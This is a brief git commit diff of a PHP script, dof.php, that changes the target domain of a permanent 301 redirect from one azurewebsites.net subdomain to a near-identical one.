0d51a98b0cf16fb2f989beadb5f89f810f23b23d
Max <hmjim@mail.ru>
2022-01-31 22:02:59 +0700

    31.01

--- dof.php
+++ dof.php
@@ -43,7 +43,7 @@ if($result===false){
     exit();
 }else{
 	header("HTTP/1.1 301 Moved Permanently"); 
-	header('Location:https://worlds-icazinozz.azurewebsites.net'.$_SERVER['REQUEST_URI']); 
+	header('Location:https://worldss-icazinozz.azurewebsites.net'.$_SERVER['REQUEST_URI']); 
 	exit;
 }
 ?>
